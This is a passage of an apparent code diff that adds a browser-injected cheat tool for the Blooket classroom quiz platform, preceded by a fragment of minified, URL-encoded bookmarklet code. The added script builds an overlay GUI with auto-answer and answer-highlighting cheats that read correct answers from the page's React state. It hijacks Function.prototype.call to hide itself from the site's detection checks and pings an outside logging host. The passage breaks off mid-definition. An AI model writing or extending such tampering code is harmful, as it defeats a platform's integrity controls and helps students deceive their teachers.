MTsiIGQ9Ik00MjcuNjE4LDY4Ljk5NGMwLDAsMy4xOTgsNDUuODMyLTE4LjAzMyw2Ni41OTFjLTIxLjIzMSwyMC43NTksMTQuMTU0LDUzLjMxNCw1Ni4xNDUsMjIuNjQ2CgljNi4wMzItNC40MDUsMTIuMTQzLTcuMjA0LDE4LjE4NC04Ljc2OGM3Ljc3Ny0yLjAxMiwxMy4yNDMtOC45NjcsMTMuMjQzLTE2Ljk5OWwwLDBjMC03LjcyNC01LjAzMS0xNC41OTctMTIuNDM4LTE2Ljc4NgoJYy00LjkyNS0xLjQ1Ni0xMS4xOC0yLjMyNS0xOC41MTYtMS4zMjVjMCwwLDI1LjM5My0yMi4xMzgsMTkuMTE5LTQ3Ljc1M2MtMi4wMjctOC4yOC0xMS44NTYtMTEuNzI2LTE4LjgzNi02LjgzMgoJQzQ1Ny40NjEsNjYuMDk0LDQ0My40NTQsNzIuNzY0LDQyNy42MTgsNjguOTk0eiIvPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8L3N2Zz4K%22%3E'%5D,S.workshop),j(%22Settings%22,null,S.settings,!0),N(h,k),N(g,k),window.addEventListener(%22keydown%22,M);let%20C=setInterval(()=%3E%7BS.alerts%5B0%5D.connection?clearInterval(C):S.alerts%5B0%5D.connect()%7D,5e3);function%20O()%7Bk.remove(),clearInterval(C);for(const%20e%20in%20S)for(const%20t%20of%20S%5Be%5D)t.enabled&&t.run();Object.keys(S).forEach(e=%3ES%5Be%5D.forEach(e=%3Ee.enabled&&(e.run(),x(...currentMode)))),window.removeEventListener(%22keydown%22,M)%7Dfunction%20M(e)%7Bvar%20t=d.data.hide%7C%7C%7Bctrl:!0,key:%22e%22%7D,o=d.data.close%7C%7C%7Bctrl:!0,key:%22x%22%7D;(t.ctrl&&e.ctrlKey%7C%7C!t.ctrl&&!e.ctrlKey)&&(t.shift&&e.shiftKey%7C%7C!t.shift&&!e.shiftKey)&&(t.alt&&e.altKey%7C%7C!t.alt&&!e.altKey)&&e.key.toLowerCase()==t.key?(e.preventDefault(),k.style.display=%22block%22===k.style.display?%22none%22:%22block%22):(o.ctrl&&e.ctrlKey%7C%7C!o.ctrl&&!e.ctrlKey)&&(o.shift&&e.shiftKey%7C%7C!o.shift&&!e.shiftKey)&&(o.alt&&e.altKey%7C%7C!o.alt&&!e.altKey)&&e.key.toLowerCase()==o.key&&(e.preventDefault(),O())%7Dfunction%20T(c,d=window)%7Breturn%20new%20Promise(t=%3E%7Bconst%20o=%7B%7D;let%20a,r,n,i;const%20s=e=%3E%7Be.preventDefault(),o%5Be.code%5D=!0,a%7C%7C=e.shiftKey,r%7C%7C=e.ctrlKey,n%7C%7C=e.altKey,%5B%22shift%22,%22control%22,%22alt%22,%22meta%22%5D.includes(e.key.toLowerCase())%7C%7C(i=e.key.toLowerCase()),c?.(%7Bshift:a,ctrl:r,alt:n,key:i%7D)%7D,l=e=%3E%7Bdelete%20o%5Be.code%5D,0%3CObject.keys(o).length%7C%7C(d.removeEventListener(%22keydown%22,s),d.removeEventListener(%22keyup%22,l),t(%7Bshift:a,ctrl:r,alt:n,key:i%7D))%7D;d.addEventListener(%22keydown%22,s),d.addEventListener(%22keyup%22,l)%7D)%7Dk.addEventListener(%22mousemove%22,e=%3E%7Bvar%20t,o;%22cheatName%22!=e.target.className&&%22scriptButton%22!=e.target.className?%220%22!=y.style.opacity&&(y.animate(%5B%7Bopacity:.9%7D,%7Bopacity:0%7D%5D,%7Bduration:200%7D),y.style.opacity=%220%22):(e=%22scriptButton%22==e.target.className?e.target:e.target.parentElement,y.innerText==e.dataset.description&&%220.9%22==y.style.opacity%7C%7C(t=e.getBoundingClientRect(),o=e.offsetParent.getBoundingClientRect(),y.innerText=e.dataset.description,%220%22==y.style.opacity&&(y.animate(%5B%7Bopacity:0%7D,%7Bopacity:.9%7D%5D,%7Bduration:200%7D),y.style.opacity=%220.9%22),y.style.left=t.x-o.x+(t.width-y.clientWidth)/2+%22px%22,y.style.top=t.y-o.y+t.height+%22px%22))%7D)%7D;let%20l=new%20Image;l.src=%22https://raw.githubusercontent.com/Coding4hours/Blooket-Cheats/main/autoupdate/timestamps/gui.png?%22+Date.now(),l.crossOrigin=%22Anonymous%22,l.onload=function()%7Bvar%20e=document.createElement(%22canvas%22).getContext(%222d%22);e.drawImage(l,0,0,this.width,this.height);let%20t=e.getImageData(0,0,this.width,this.height)%5B%22data%22%5D,o=%22%22,a;for(let%20e=0;e%3Ct.length;e+=4)%7Bvar%20r=String.fromCharCode(256*t%5Be+1%5D+t%5Be+2%5D);if(o+=r,%22/%22==r&&%22*%22==a)break;a=r%7Dvar%20e=document.querySelector(%22iframe%22),%5B,n,i%5D=o.match(/LastUpdated:%20(.+?);%20ErrorMessage:%20%22(.+?)%22/);(parseInt(n)%3C=1696542129455%7C%7Ce.contentWindow.confirm(i))&&s()%7D,l.onerror=l.onabort=()=%3E(l.src=null,s())%7D)();
+(() => {
+    const cheat = (async () => {
+        if (String(Function.prototype.call).includes('native')) {
+            let call = Function.prototype.call;
+            let iframe = document.createElement("iframe");
+            document.body.append(iframe);
+            iframe.style.display = "none";
+            let funcs = {
+                querySelectorAll: function () {
+                    if (["#JODGUI", "#JODMOBILE", "#currPageEl", "#YTRkNmM2MWEtOTg3Zi00YmE1LWI1NzUtNTgyOTUzMWI4ZDYx", "#ODJkMThlMDEtYmEwNi00MzE4LTg4ZGMtM2Y2ZDI0MzY4ZjU2", ".cheatList", ".cheatName", "bG1mYW8=", "#aXQncyBjYXQgYW5kIG1vdXNlIGF0IHRoaXMgcG9pbnQ"].includes(arguments[0]))
+                        return [];
+                    return iframe.contentDocument.querySelectorAll.apply(document, arguments);
+                },
+                querySelector: iframe.contentDocument.querySelector.bind(document),
+                includes: function () {
+                    if (["Cheats", "Global", "Global Cheats", "Discord - oneminesraft2", "Auto Answer (Toggle)", "Auto Sell Dupes On Open", "Spam Buy Blooks", "Food Game", "Change Blook Ingame", "Get Daily Rewards", "Remove Name Limit", "Simulate Unlock", "Cheat ESP", "Gold Quest Cheats", "Cafe Cheats", "Crypto Hack Cheats", "Deceptive Dinos Cheats", "Tower Defense Cheats", "Tower Defense2 Cheats", "Factory Cheats", "Fishing Frenzy Cheats", "Flappy Blook Cheats", "Tower of Doom Cheats", "Crazy Kingdom Cheats", "Racing Cheats", "Battle Royale Cheats", "Blook Rush Cheats", "Monster Brawl Cheats", "Santa's Workshop Cheats"].includes(arguments[0]))
+                        return false;
+                    return iframe.contentWindow.String.prototype.call(this, arguments);
+                },
+                fetch: iframe.contentWindow.fetch.bind(window),
+                btoa: iframe.contentWindow.btoa.bind(window),
+                getItem: iframe.contentWindow.localStorage.getItem.bind(window.localStorage)
+            }, funcNames = Object.keys(funcs);
+            Function.prototype.call = function () {
+                if (funcNames.includes(this.name)) return call.apply(funcs[this.name], arguments);
+                return call.apply(this, arguments)
+            }
+                ; (new Image).src = "https://gui-logger.onrender.com/gui/1?" + Date.now();
+        }
+        function createElement(node, props = {}, ...children) {
+            const element = document.createElement(node);
+            if (typeof props.style == "object") {
+                let result = "";
+                for (const style in props.style) result += `${style.replace(/[A-Z]/g, match => `-${match.toLowerCase()}`)}: ${props.style[style]}; `;
+                props.style = result;
+            }
+            for (const prop in props) element[prop] = props[prop];
+            for (const child of children) element.append(child);
+            return element;
+        }
+        let settings, settingsKey = "05konzWasHere";
+        const Settings = {
+            data: null,
+            setItem(k, v) {
+                k.split('.').reduce((obj, k, i, a) => (++i == a.length && (obj[k] = v), obj[k]), this.data);
+                localStorage.setItem(settingsKey, JSON.stringify(this.data));
+                return this.data;
+            },
+            deleteItem(k) {
+                k.split('.').reduce((obj, k, i, a) => (++i == a.length && (delete obj[k]), obj[k]), this.data);
+                localStorage.setItem(settingsKey, JSON.stringify(this.data));
+                return this.data;
+            },
+            setData(v) {
+                this.data = v;
+                localStorage.setItem(settingsKey, JSON.stringify(this.data));
+            }
+        }
+        try {
+            Settings.data = JSON.parse(localStorage.getItem(settingsKey) || "{}");
+            for (const setting of ["backgroundColor", "cheatList", "contentBackground", "defaultButton", "disabledButton", "enabledButton", "infoColor", "inputColor", "textColor"]) if (Settings.data[setting]) {
+                Settings.setItem(`theme.${setting}`, Settings.data[setting]);
+                Settings.deleteItem(setting);
+            }
+        } catch {
+            Settings.setData({});
+        }
+        let variables, gui, cheatContainer, controls, controlButtons, dragButton, content, tooltip, cheats, headerText;
+        const guiWrapper = createElement("div", {
+            style: {
+                top: `${(Math.max(10, window.innerHeight - 600) / 2)}px`,
+                left: `${(Math.max(10, window.innerWidth - 1000) / 2)}px`,
+                transform: `scale(${Settings.data.scale})`,
+                position: "fixed", height: "80%", width: "80%", maxHeight: "600px", maxWidth: "1000px", zIndex: "999", display: "block",
+            }
+        },
+            (variables = createElement("style", {
+                id: "variables",
+                innerHTML: `:root {--backgroundColor: ${Settings.data?.theme?.backgroundColor || "rgb(11, 194, 207)"};--infoColor: ${Settings.data?.theme?.infoColor || "#9a49aa"};--cheatList: ${Settings.data?.theme?.cheatList || "#9a49aa"};--defaultButton: ${Settings.data?.theme?.defaultButton || "#9a49aa"};--disabledButton: ${Settings.data?.theme?.disabledButton || "#A02626"};--enabledButton: ${Settings.data?.theme?.enabledButton || "#47A547"};--textColor: ${Settings.data?.theme?.textColor || "white"};--inputColor: ${Settings.data?.theme?.inputColor || "#7a039d"};--contentBackground: ${Settings.data?.theme?.contentBackground || "rgb(64, 17, 95)"};}`
+            })),
+            createElement("style", {
+                innerHTML: `.alertList::-webkit-scrollbar{display:none;}.alertList{-ms-overflow-style: none;scrollbar-width: none;}.contentWrapper::-webkit-scrollbar{display:none;}.contentWrapper{-ms-overflow-style: none;scrollbar-width: none;}.cheatButton{position:relative;display:flex;flex-direction:row;align-items:center;min-height:40px;width:190px;margin:4px 0;padding-left:30px;box-sizing:border-box;cursor:pointer;user-select:none;text-decoration:none;border-top-right-radius:5px;border-bottom-right-radius:5px;background-color:transparent;color:var(--textColor);transition:.2s linear;font-size:20px;font-weight:400;font-family:Nunito;text-decoration-thickness:auto}.cheatButton:hover{background-color:var(--textColor);color:var(--defaultButton)}.cheatInput,select{min-width:200px;padding-block:5px;font-family:Nunito,sans-serif;font-weight:400;font-size:16px;background-color:var(--inputColor);box-shadow:inset 0 6px rgb(0 0 0 / 20%);margin:3px;color:var(--textColor)}.bigButton:hover{filter:brightness(110%);transform:translateY(-2px)}.bigButton:active{transform:translateY(2px)}.cheatList::-webkit-scrollbar{width:10px}.cheatList::-webkit-scrollbar-track{background:var(--cheatList)}.cheatList::-webkit-scrollbar-thumb{background:var(--cheatList);box-shadow: inset -10px 0 rgb(0 0 0 / 20%)}.cheatList::-webkit-scrollbar-thumb:hover{background:var(--cheatList); box-shadow: inset -10px 0 rgb(0 0 0 / 30%); }.scriptButton:hover{filter:brightness(120%)}.cheatInput{max-width:200px;border:none;border-radius:7px;caret-color:var(--textColor)}.cheatInput::placeholder{color:var(--textColor)}.cheatInput:focus,select:focus{outline:0}.cheatInput::-webkit-inner-spin-button,.cheatInput::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}.cheatInput[type=number]{-moz-appearance:textfield}select{border:none;border-radius:7px;text-align:center}.scriptButton{align-items: center; box-sizing: border-box; display: flex; flex-direction: column; justify-content: center; margin: 10px; padding: 5px 5px 11px; position: relative; width: 250px; font-family: Nunito, sans-serif; font-weight: 400; color: var(--textColor); box-shadow: inset 0 -6px rgb(0 0 0 / 20%); border-radius: 7px; cursor: pointer; transition: filter .25s;}.tooltip::after {content: "";position: absolute;width: 10px;height: 10px;background-color: inherit;top: -5px;left: 50%;margin-left: -6px;transform: rotate(135deg)}`
+            }),
+            (gui = createElement("div", {
+                style: {
+                    width: "100%",
+                    height: "100%",
+                    position: "relative",
+                    outline: "3px solid #3a3a3a",
+                    borderRadius: "15px",
+                    overflow: "hidden"
+                }
+            },
+                createElement("div", {
+                    id: "background",
+                    style: {
+                        display: "block",
+                        top: "0",
+                        left: "0",
+                        height: "100%",
+                        overflowY: "hidden",
+                        overflowX: "hidden",
+                        position: "absolute",
+                        width: "100%",
+                        background: "var(--backgroundColor)",
+                        visibility: "visible"
+                    }
+                },
+                    createElement("div", {
+                        id: "backgroundImage",
+                        style: {
+                            backgroundImage: "url(https://ac.blooket.com/dashboard/65a43218fd1cabe52bdf1cda34613e9e.png)",
+                            display: "block",
+                            height: "200%",
+                            position: "absolute",
+                            width: "200%",
+                            top: "50%",
+                            left: "50%",
+                            backgroundPositionX: "-100px",
+                            backgroundPositionY: "-100px",
+                            backgroundSize: "550px",
+                            visibility: "visible",
+                            transform: "translate(-50%,-50%) rotate(15deg)",
+                            appearance: "none",
+                            opacity: "0.175"
+                        }
+                    })),
+                (controls = createElement("div", {
+                    id: "controls",
+                    style: {
+                        display: "flex",
+                        alignItems: "center",
+                        justifyContent: "center",
+                        paddingBottom: "8px",
+                        paddingInline: "15px",
+                        position: "absolute",
+                        left: "220px",
+                        top: "0",
+                        visibility: "visible",
+                        zIndex: "5",
+                        height: "52px",
+                        width: "max-content",
+                        background: "var(--infoColor)",
+                        boxShadow: "inset 0 -8px rgb(0 0 0 / 20%), 0 0 4px rgb(0 0 0 / 15%)",
+                        borderBottomRightRadius: "10px",
+                        color: "var(--textColor)",
+                        fontFamily: "Nunito, sans-serif",
+                        fontWeight: "700",
+                        userSelect: "text"
+                    },
+                    innerText: (({ ctrl: ctrlHide, shift: shiftHide, alt: altHide, key: keyHide } = { ctrl: true, key: "e" }, { ctrl: ctrlClose, shift: shiftClose, alt: altClose, key: keyClose } = { ctrl: true, key: "x" }) => `${[ctrlHide && "Ctrl", shiftHide && "Shift", altHide && "Alt", keyHide && keyHide.toUpperCase()].filter(Boolean).join(' + ')} to hide | ${[ctrlClose && "Ctrl", shiftClose && "Shift", altClose && "Alt", keyClose && keyClose.toUpperCase()].filter(Boolean).join(' + ')} for quick disable\nClick and drag here`)(Settings.data.hide || { ctrl: true, key: "e" }, Settings.data.close || { ctrl: true, key: "x" }),
+                    update: (({ ctrl: ctrlHide, shift: shiftHide, alt: altHide, key: keyHide } = { ctrl: true, key: "e" }, { ctrl: ctrlClose, shift: shiftClose, alt: altClose, key: keyClose } = { ctrl: true, key: "x" }) => controls.innerText = `${[ctrlHide && "Ctrl", shiftHide && "Shift", altHide && "Alt", keyHide && keyHide.toUpperCase()].filter(Boolean).join(' + ')} to hide | ${[ctrlClose && "Ctrl", shiftClose && "Shift", altClose && "Alt", keyClose && keyClose.toUpperCase()].filter(Boolean).join(' + ')} for quick disable\nClick and drag here`)
+                })),
+                createElement("div", {
+                    id: "credits",
+                    style: {
+                        display: "flex",
+                        alignItems: "center",
+                        justifyContent: "center",
+                        paddingBottom: "8px",
+                        position: "absolute",
+                        right: "0",
+                        top: "0",
+                        visibility: "visible",
+                        zIndex: "5",
+                        height: "47px",
+                        width: "210px",
+                        background: "var(--infoColor)",
+                        boxShadow: "inset 0 -8px rgb(0 0 0 / 20%), 0 0 4px rgb(0 0 0 / 15%)",
+                        borderBottomLeftRadius: "10px",
+                        color: "var(--textColor)",
+                        fontFamily: "Nunito, sans-serif",
+                        fontWeight: "700",
+                        userSelect: "text"
+                    },
+                    innerHTML: "GitHub - bob - gob",
+                    onclick: () => window.open("https://github.com/05Konz2/Blooket-Cheats", "_blank").focus()
+                }),
+                (controlButtons = createElement("div", {
+                    id: "controlButtons",
+                    style: {
+                        display: "flex",
+                        alignItems: "center",
+                        justifyContent: "center",
+                        position: "absolute",
+                        right: "0",
+                        bottom: "0",
+                        visibility: "visible",
+                        zIndex: "5",
+                        height: "55px",
+                        width: "165px",
+                        background: "#none",
+                        borderLeft: "3px solid black",
+                        borderTop: "3px solid black",
+                        borderTopLeftRadius: "10px",
+                        color: "white",
+                        fontFamily: "Nunito, sans-serif",
+                        fontWeight: "700",
+                        userSelect: "text",
+                        overflow: "hidden",
+                        pointerEvents: "all"
+                    }
+                },
+                    (dragButton = createElement("button", {
+                        style: {
+                            height: "55px",
+                            width: "55px",
+                            fontFamily: "Nunito",
+                            color: "white",
+                            backgroundColor: "#00a0ff",
+                            border: "none",
+                            fontSize: "2rem",
+                            cursor: "move"
+                        },
+                        innerHTML: "✥"
+                    })),
+                    createElement("button", {
+                        style: {
+                            height: "55px",
+                            width: "55px",
+                            fontFamily: "Nunito",
+                            color: "white",
+                            backgroundColor: "grey",
+                            border: "none",
+                            fontSize: "2rem",
+                            fontWeight: "bolder",
+                            cursor: "pointer"
+                        },
+                        innerHTML: "-",
+                        onclick: (function () {
+                            let hidden = false;
+                            return () => {
+                                for (let child of [...gui.children]) {
+                                    if (child == controlButtons) continue;
+                                    if (hidden) child.style.display = child.style._display;
+                                    else {
+                                        child.style._display = child.style.display;
+                                        child.style.display = "none";
+                                    }
+                                };
+                                gui.style.height = hidden ? "100%" : "55px";
+                                gui.style.width = hidden ? "100%" : "165px";
+                                guiWrapper.style.top = `${parseInt(guiWrapper.style.top) + (guiWrapper.offsetHeight - 55) * (hidden ? -1 : 1)}px`;
+                                guiWrapper.style.left = `${parseInt(guiWrapper.style.left) + (guiWrapper.offsetWidth - 165) * (hidden ? -1 : 1)}px`;
+                                guiWrapper.style.pointerEvents = hidden ? "unset" : "none";
+                                hidden = !hidden;
+                            };
+                        })()
+                    }),
+                    createElement("button", {
+                        style: {
+                            height: "55px",
+                            width: "55px",
+                            fontFamily: "Nunito",
+                            color: "white",
+                            backgroundColor: "red",
+                            border: "none",
+                            fontSize: "2rem",
+                            fontWeight: "bolder",
+                            cursor: "pointer"
+                        },
+                        innerHTML: "X",
+                        onclick: close
+                    }))),
+                (cheatContainer = createElement("div", {
+                    className: "cheatList",
+                    style: {
+                        overflowY: "scroll",
+                        background: "var(--cheatList)",
+                        boxShadow: "inset -10px 0 rgb(0 0 0 / 20%)",
+                        zIndex: "5",
+                        width: "220px",
+                        position: "absolute",
+                        top: "0",
+                        left: "0",
+                        height: "100%",
+                        fontFamily: "Titan One",
+                        color: "var(--textColor)",
+                        fontSize: "40px",
+                        textAlign: "center",
+                        paddingTop: "20px",
+                        userSelect: "none",
+                        padding: "20px 10px 20px 0",
+                        boxSizing: "border-box",
+                        display: "flex",
+                        flexDirection: "column"
+                    },
+                    innerHTML: "<span style=\"text-shadow: 1px 1px rgb(0 0 0 / 40%)\">Cheats</span>"
+                },
+                    createElement("a", {
+                        className: "bigButton",
+                        style: {
+                            cursor: "pointer",
+                            display: "block",
+                            fontFamily: "Titan One",
+                            margin: "20px auto 10px",
+                            position: "relative",
+                            transition: ".25s",
+                            textDecoration: "none",
+                            userSelect: "none",
+                            visibility: "visible"
+                        },
+                        target: "_blank",
+                        href: "https://discord.gg/jHjGrrdXP6",
+                        innerHTML: `<div style="background: rgba(0,0,0,.25); border-radius: 5px; display: block; width: 100%; height: 100%; left: 0; top: 0; position: absolute; transform: translateY(2px); width: 100%; transition: transform .6s cubic-bezier(.3,.7,.4,1)"></div>
+            <div style="background-color: rgb(11, 194, 207); filter: brightness(.7); position: absolute; top: 0; left: 0; width: 100%; height: 100%; border-radius: 5px;"></div>
+            <div style="font-weight: 400; background-color: rgb(11, 194, 207); color: white; display: flex; flex-direction: row; align-items: center; justify-content: center; text-align: center; padding: 5px; border-radius: 5px; transform: translateY(-4px); transition: transform .6s cubic-bezier(.3,.7,.4,1)">
+            <div style="font-family: Titan One, sans-serif; color: white; font-size: 26px; text-shadow: 2px 2px rgb(0 0 0 / 20%); height: 40px; padding: 0 15px; display: flex; flex-direction: row; align-items: center; justify-content: center">
+                <svg style="filter: drop-shadow(2px 2px 0 rgb(0 0 0 / 20%))" xmlns="http://www.w3.org/2000/svg" width="35" height="35" fill="currentColor" viewBox="0 -1 21 16">
+                    <path d="M13.545 2.907a13.227 13.227 0 0 0-3.257-1.011.05.05 0 0 0-.052.025c-.141.25-.297.577-.406.833a12.19 12.19 0 0 0-3.658 0 8.258 8.258 0 0 0-.412-.833.051.051 0 0 0-.052-.025c-1.125.194-2.22.534-3.257 1.011a.041.041 0 0 0-.021.018C.356 6.024-.213 9.047.066 12.032c.001.014.01.028.021.037a13.276 13.276 0 0 0 3.995 2.02.05.05 0 0 0 .056-.019c.308-.42.582-.863.818-1.329a.05.05 0 0 0-.01-.059.051.051 0 0 0-.018-.011 8.875 8.875 0 0 1-1.248-.595.05.05 0 0 1-.02-.066.051.051 0 0 1 .015-.019c.084-.063.168-.129.248-.195a.05.05 0 0 1 .051-.007c2.619 1.196 5.454 1.196 8.041 0a.052.052 0 0 1 .053.007c.08.066.164.132.248.195a.051.051 0 0 1-.004.085 8.254 8.254 0 0 1-1.249.594.05.05 0 0 0-.03.03.052.052 0 0 0 .003.041c.24.465.515.909.817 1.329a.05.05 0 0 0 .056.019 13.235 13.235 0 0 0 4.001-2.02.049.049 0 0 0 .021-.037c.334-3.451-.559-6.449-2.366-9.106a.034.034 0 0 0-.02-.019Zm-8.198 7.307c-.789 0-1.438-.724-1.438-1.612 0-.889.637-1.613 1.438-1.613.807 0 1.45.73 1.438 1.613 0 .888-.637 1.612-1.438 1.612Zm5.316 0c-.788 0-1.438-.724-1.438-1.612 0-.889.637-1.613 1.438-1.613.807 0 1.451.73 1.438 1.613 0 .888-.631 1.612-1.438 1.612Z"/>
+                </svg>
+                Discord
+            </div>
+            </div>`
+                    }))), createElement("div", {
+                        className: "contentWrapper",
+                        style: {
+                            position: "absolute",
+                            left: "220px",
+                            top: "70px",
+                            overflowY: "scroll",
+                            width: "calc(100% - 220px)",
+                            height: "calc(100% - 70px)",
+                            borderRadius: "7px"
+                        }
+                    },
+                        (content = createElement("div", {
+                            id: "content",
+                            style: {
+                                position: "absolute",
+                                inset: "27px 50px 50px 50px"
+                            }
+                        },
+                            (tooltip = createElement("div", {
+                                className: "tooltip",
+                                style: {
+                                    position: "absolute",
+                                    top: "0",
+                                    left: "0",
+                                    backgroundColor: "black",
+                                    height: "fit-content",
+                                    maxWidth: "300px",
+                                    zIndex: "5",
+                                    borderRadius: "7.5px",
+                                    color: "white",
+                                    display: "flex",
+                                    justifyContent: "center",
+                                    alignItems: "center",
+                                    padding: "5px",
+                                    paddingInline: "15px",
+                                    pointerEvents: "none",
+                                    opacity: "0",
+                                    textAlign: "center"
+                                },
+                                innerText: "description"
+                            })),
+                            (cheats = createElement("div", {
+                                style: {
+                                    alignItems: "center",
+                                    boxSizing: "border-box",
+                                    display: "flex",
+                                    flexDirection: "row",
+                                    flexWrap: "wrap",
+                                    justifyContent: "space-evenly",
+                                    padding: "20px 5px 20px",
+                                    position: "relative",
+                                    width: "100%",
+                                    fontFamily: "Nunito, sans-serif",
+                                    fontWeight: "400",
+                                    color: "var(--textColor)",
+                                    background: "var(--contentBackground)",
+                                    boxShadow: "inset 0 -6px rgb(0 0 0 / 20%)",
+                                    borderRadius: "7px"
+                                }
+                            },
+                                (headerText = createElement("div", {
+                                    className: "headerText",
+                                    style: {
+                                        boxSizing: "border-box",
+                                        display: "block",
+                                        height: "45px",
+                                        left: "-10px",
+                                        padding: "4px 4px 8px",
+                                        position: "absolute",
+                                        top: "-28px",
+                                        backgroundColor: "#ef7426",
+                                        boxShadow: "0 4px rgb(0 0 0 / 20%), inset 0 -4px rgb(0 0 0 / 20%)",
+                                        borderRadius: "7px"
+                                    }
+                                },
+                                    createElement("div", {
+                                        style: {
+                                            alignItems: "center",
+                                            boxSizing: "border-box",
+                                            display: "flex",
+                                            height: "100%",
+                                            justifyContent: "center",
+                                            padding: "0 15px",
+                                            width: "100%",
+                                            fontFamily: "Titan One, sans-serif",
+                                            fontSize: "26px",
+                                            fontWeight: "400",
+                                            textShadow: "-1px -1px 0 #646464, 1px -1px 0 #646464, -1px 1px 0 #646464, 2px 2px 0 #646464",
+                                            color: "white",
+                                            background: "linear-gradient(#fcd843,#fcd843 50%,#feb31a 50.01%,#feb31a)",
+                                            borderRadius: "5px"
+                                        }
+                                    })
+                                ))
+                            ))
+                        ))
+                    )
+            ))
+        );
+        
+        document.body.appendChild(guiWrapper);
+        
+        
+        function addMode(mode, img, cheats, nameOnly) {
+            const button = createElement("div", {
+                className: "cheatButton",
+                innerHTML: (typeof img == "string" ? `<img style="height: 30px; margin-right: 5px" src="${img}">` : img ? img : "") + mode,
+                onclick: () => setCheats(button.innerText, cheats, nameOnly)
+            });
+            cheatContainer.appendChild(button);
+            return button.onclick;
+        }
+        async function setCheats(mode, scripts, nameOnly) {
+            cheats.innerHTML = "";
+            headerText.firstChild.innerText = `${mode}${nameOnly ? "" : " Cheats"}`;
+            cheats.append(headerText);
+        
+            for (let i = 0; i < scripts.length; i++) {
+                let { name, description, type, inputs, enabled, run, element } = scripts[i];
+                let toggle = type == "toggle";
+                if (!element) {
+                    const button = createElement("div", {
+                        className: "scriptButton",
+                        style: { background: toggle ? enabled ? "var(--enabledButton)" : "var(--disabledButton)" : "var(--defaultButton)" }
+                    }, createElement("div", {
+                        className: "cheatName",
+                        innerHTML: name
+                    }));
+                    button.dataset.description = description;
+                    button.onclick = (function ({ target, key }) {
+                        if (target != button && !target.classList.contains("cheatName") && !(key == "Enter" && target.classList.contains("cheatInput"))) return;
+                        let args = [...button.children].slice(1);
+                        run.apply(this, args.map(c => c.type == "number" ? parseInt("0" + c.value) : c.nodeName == "SELECT" ? JSON.parse(c.value) : (c.data || c.value)));
+                        if (toggle) button.style.background = this.enabled ? "var(--enabledButton)" : "var(--disabledButton)";
+                    }).bind(scripts[i]);
+                    if (inputs?.length) for (let i = 0; i < inputs.length; i++) {
+                        const { name, type, options: opts, min, max, value } = inputs[i];
+                        let options;
+                        try { options = await (typeof opts == "function" ? opts?.() : opts) } catch { options = [] };
+                        if (type == "options" && options?.length) {
+                            const select = document.createElement("select");
+                            options.forEach(opt => {
+                                const option = document.createElement("option");
+                                option.value = JSON.stringify(opt?.value != null ? opt.value : opt);
+                                option.innerHTML = opt?.name || opt;
+                                select.appendChild(option);
+                            });
+                            button.appendChild(select);
+                        } else if (type == "function") {
+                            const input = document.createElement("input");
+                            input.classList.add("cheatInput");
+                            input.placeholder = name;
+                            input.style.textAlign = "center";
+                            input.readOnly = true;
+                            let locked = false;
+                            input.onclick = async () => {
+                                if (locked) return;
+                                input.value = "Waiting for input...";
+                                locked = true;
+                                input.data = await inputs[i].function((e) => input.value = e + "...");
+                                locked = false;
+                                input.value = input.value.slice(0, -3);
+                            }
+                            button.appendChild(input);
+                        } else {
+                            const input = document.createElement("input");
+                            input.classList.add("cheatInput");
+                            if (type == "number") {
+                                input.type = "number";
+                                input.min = min;
+                                input.max = max;
+                                input.value = value || (min != null ? min : 0);
+                            };
+                            input.placeholder = name;
+                            input.style.textAlign = "center";
+                            if (toggle) input.style.backgroundColor = "#0003";
+                            input.onkeyup = button.onclick;
+                            button.appendChild(input);
+                        }
+                    };
+                    scripts[i].element = button;
+                }
+                cheats.appendChild(scripts[i].element);
+            };
+            /*  scripts
+                {
+                    name: "",
+                    description: "",
+                    type: (null | "toggle"),
+                    inputs: type == null && [{
+                        name: "",
+                        type: ("number" | "string" | "options"),
+                        options: type == "options" && [
+                            {
+                                name: "",
+                                value: undefined
+                            };
+                        ]
+                    }],
+                    enabled: type == "toggle" && Boolean,
+                    run: function () {};
+                };
+            */
+        }
+        const Cheats = {
+            global: [
+                {
+                    name: "Auto Answer",
+                    description: "Toggles auto answer on",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function () {
+                        if (!this.enabled) {
+                            this.enabled = true;
+                            this.data = setInterval(() => {
+                                const { stateNode: { state: { question, stage, feedback }, props: { client: { question: pquestion } } } } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                                const q = (question || pquestion);
+                                try {
+                                    if (q.qType != "typing") if (stage !== "feedback" && !feedback) [...document.querySelectorAll(`[class*="answerContainer"]`)][q.answers.map((x, i) => q.correctAnswers.includes(x) ? i : null).filter(x => x != null)[0]]?.click?.();
+                                    else document.querySelector('[class*="feedback"]')?.firstChild?.click?.();
+                                    else Object.values(document.querySelector("[class*='typingAnswerWrapper']"))[1].children._owner.stateNode.sendAnswer(q.answers[0])
+                                } catch { }
+                            }, 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                        }
+                    }
+                },
+                {
+                    name: "Highlight Answers",
+                    description: "Toggles highlight answers on",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function () {
+                        if (!this.enabled) {
+                            this.enabled = true;
+                            this.data = setInterval(() => {
+                                const { stateNode: { state, props } } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                                [...document.querySelectorAll(`[class*="answerContainer"]`)].forEach((answer, i) => {
+                                    if ((state.question || props.client.question).correctAnswers.includes((state.question || props.client.question).answers[i])) answer.style.backgroundColor = "rgb(0, 207, 119)";
+                                    else answer.style.backgroundColor = "rgb(189, 15, 38)";
+                                });
+                            }, 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                        }
+                    }
+                },
+                {
+                    name: "Subtle Highlight Answers",
+                    description: "Toggles subtle highlight answers on",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function () {
+                        if (!this.enabled) {
